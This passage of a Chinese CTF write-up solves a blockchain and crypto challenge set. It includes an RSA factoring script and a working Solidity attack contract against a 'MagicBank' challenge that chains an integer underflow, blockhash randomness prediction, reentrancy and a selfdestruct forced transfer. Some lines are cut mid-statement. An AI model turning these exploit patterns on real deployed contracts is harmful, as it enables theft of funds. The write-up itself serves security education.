    }
    constructor(uint256 _cutOffBlockNumber) public {
        owner = msg.sender;         
        balanceOf[owner] = 100000000000;
        cutOffBlockNumber = _cutOffBlockNumber;
    }
我感觉这个算是设计的不好，好在提交的时候提到了构造函数的问题，经师傅锦囊指点，给出了正确解答。这里的设计非常奇怪，我们常见的游戏合约，都是设计游戏时长，这个却设计的是输入截断高度。当合约部署时输入错误，会导致游戏不开始or永远无法结束。给出这样的设计更好：
    require(游戏长度> 1000 and 游戏长度 常见不安全的“随机数”计算方法，会读取当前块的前一个块的哈希 block.blockhash(block.number-1) 作为随机源。而在合约内执行
> block.blockhash(block.number) 返回值为
> 0。我们无法在合约内获得当前区块的哈希，这是因为矿工打包并执行交易时，当前区块哈希尚未被算出。因此，我们可以认为“当前区块”哈希是“未来”的，无法预测。
#### 其他
  * solidity版本过低
  * 上个safemath库，不过这个合约上下溢处理的都ok
### Q11 - 密码学RSA
这题是小伙伴HWHong做的，师傅web渗透一把手，密码学也超厉害！
明文:`something_for_nothing`
思路赛后在群里已经有了，大体是可以看到n2可分解为多个素数，只有一个密文，说明n1是加密用的n，n2是hint。
因为n1，n2高位相同，假设:
  * n1 = p1 * q1
  * n2 = (p1 + a) * (q1 + b)
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from gmpy2 import is_prime as prime
    from gmpy2 import iroot
    n = 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L
    nn = 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154673727252437046185126099084752843732400209032782207790902956024459189700856089587545302854326571561755007254420608514135036673700243280752364319986331493694769729841789115612749641973878393284804681876299531933348630664123809944975501332215753682284226293973903784246618067269627749460102002825975011735463170307L
    # print nn > n
    t = nn - n
    def f1(x, y): return pow(x * y - t, 2) - 4 * n * x * y
    def f2(x, y, s): return (t - x * y - s) / (2 * x)
    for x in xrange(366, 3000):
        for y in xrange(1, 3000):
            print x, y
            if f1(x, y) >= 0:
                s, b = iroot(f1(x, y), 2)
                if b:
                    if prime(f2(x, y, int(s))):
                        print "Success"
                        print f2(x, y, int(s))
                        exit()
之后RSA解密即可
    def egcd(a, b):
        if a == 0:
            return (b, 0, 1)
        else:
            g, y, x = egcd(b % a, a)
            return (g, x - (b // a) * y, y)
    def modinv(a, m):
        g, x, y = egcd(a, m)
        if g != 1:
            raise Exception('modular inverse does not exist')
        else:
            return x % m
    def bytes_to_num(b):
        return int(b.encode('hex'), 16)
    def num_to_bytes(n):
        b = hex(n)[2:-1]
        b = '0' + b if len(b)%2 == 1 else b #16进制补成偶数位
        return b.decode('hex')
    def gcd(a, b):
        if a  uint) public balanceOf;
        mapping(address => uint) public creditOf;
        address owner;
        constructor()public{
            owner = msg.sender;
        }
        function transferBalance(address to, uint amount) public{
            require(balanceOf[msg.sender] - amount >= 0);
            balanceOf[msg.sender] -= amount;
            balanceOf[to] += amount;
        }
        event SendFlag(uint256 flagnum, string b64email);
        function sendFlag3(string b64email) public {
            require(balanceOf[msg.sender] >= 10000);
            emit SendFlag(1, b64email);
        }
        function guessRandom(uint256 guess) internal view returns(bool){
            uint256 seed = uint256(blockhash(block.number-1));
            uint256 rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;
            return rand == guess;
        }
        function buyCredit(uint256 guess) public {
            require(guessRandom(guess));
            require(balanceOf[msg.sender] >= 10000);
            require(creditOf[msg.sender] == 0);
            creditOf[msg.sender] = 1;
            balanceOf[msg.sender] -= 10000;
        }
        function withdrawCredit(uint amount) public{
            require(creditOf[msg.sender] >= amount);
            msg.sender.call.value(amount*1000000000)();
            creditOf[msg.sender] -= amount;
        }
        function sendFlag4(string b64email) public {
            require(creditOf[msg.sender] >= 10000);
            emit SendFlag(2, b64email);
        }
        function getEthBalance() public view returns(uint256){
            return this.balance;
        }
        modifier onlyOwner(){
            require(msg.sender == owner);
            _;
        }
        function kill(address t) public onlyOwner {
            selfdestruct(t);
        }
    }
这题的流程是这样的：
  1. 首先随意`transferBalance()`一下，造成下溢，让balance很大，获得flag3
  2. 绕过随机数预测，成功调用`buyCredit()`，购买信用。
  3. `withdrawCredit()`中依然存在下溢问题，但是require变严格，需要使用重入攻击，在未更新credit时，多取几次。
  4. 上面的攻击遇到一个问题，就是目标合约里没有钱。且目标合约的回调函数没有payable，需要创建另一个合约，selfdestruct后，强制给目标合约转账。
  5. credit下溢后，获得flag4。
攻击合约：
    contract magic_attack {
        address owner;
        string private email = "OTA3ODg2MDc2QHFxLmNvbQ==";
        address private victim = 0x1180e23d7360fc19cf7c7cd26160763b500b158b;
        uint256 public rand = 0;
        constructor()public{
            owner = msg.sender;
            email = "OTA3ODg2MDc2QHFxLmNvbQ==";
        }
        function step1() public{
            address my_to = 0x1180e23d7360fc19cf7c7cd26160763b500b151c;
            uint256 amount = 0x186a0;
            victim.call(bytes4(keccak256("transferBalance(address,uint256)")),my_to,amount);
        }
        function step2() public{
            uint256 seed = uint256(blockhash(block.number-1));
            rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;
            victim.call(bytes4(keccak256("buyCredit(uint256)")),rand);
        }
        //在这里，另一个合约自毁。
        function step3() public{
            victim.call(bytes4(keccak256("withdrawCredit(uint256)")),1);
        }
        function () payable public{
            victim.call(bytes4(keccak256("withdrawCredit(uint256)")),1);
        }
        function test() public{
            MagicBank mb = MagicBank(victim);
            mb.sendFlag4(email);
        }
    }
    contract bomb {
        address owner;
        constructor()public{
            owner = msg.sender;
        }
        function () payable public{}
        function end() public{
            selfdestruct(0x1180e23d7360fc19cf7c7cd26160763b500b158b);
        }
    }
## 总结
本次比赛天枢获得了第二名的好成绩，与小伙伴们在比赛中的默契配合息息相关的。
让我总结一下区块链安全的要义，我想说：想象力就是武器。面对区块链和智能合约的题目，只有胆大心细多思考，才能想出完整的攻击链。
现实中，合约、节点、共识算法、钱包、交易所等等，无论哪方面薄弱，都会让黑客有着把货币席卷一空的可能。
就像是在赛事最后分享环节我所说，希望大家在工作中胆大心细，注意好系统的细枝末节，作为安全从业人员，才算真正完成了我们的工作。